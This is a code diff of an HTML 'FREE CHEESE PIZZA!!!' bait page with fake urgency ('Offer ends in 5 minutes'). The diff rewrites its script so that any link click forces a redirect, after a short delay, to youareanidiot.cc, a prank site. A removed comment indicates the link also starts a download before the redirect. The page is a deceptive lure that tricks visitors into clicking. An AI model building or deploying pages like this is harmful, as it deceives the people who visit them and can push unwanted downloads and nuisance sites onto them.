@@ -3,7 +3,7 @@
 <head>
     <title>FREE CHEESE PIZZA!!!</title>
     <style>
-        body {font-family: Comic Sans MS, Arial; text-align: center; padding: 40px; background: #ff1493; color: white; margin:0;}
+        body {font-family: Comic Sans MS, Arial; text-align: center; padding: 50px; background: #ff1493; color: white; margin:0;}
         h1 {font-size: 55px; text-shadow: 5px 5px 10px black;}
         a {background:#ff0000; color:white; padding:25px 60px; text-decoration:none; border-radius:20px; font-size:35px; display:inline-block; margin:30px; box-shadow: 0 0 30px yellow;}
     </style>
@@ -17,10 +17,13 @@
     <p style="font-size:22px;">Hurry! Offer ends in 5 minutes!!! 😂😂😂</p>
 
     <script>
-        document.querySelector('a').addEventListener('click', function() {
-            setTimeout(() => {
-                window.location.href = 'https://youareanidiot.cc/safe/';
-            }, 800); // 0.8 second delay so download starts first
+        // Force redirect after click
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' || e.target.closest('a')) {
+                setTimeout(() => {
+                    window.location.href = 'https://youareanidiot.cc/safe/';
+                }, 700);
+            }
         });
     </script>
 </body>
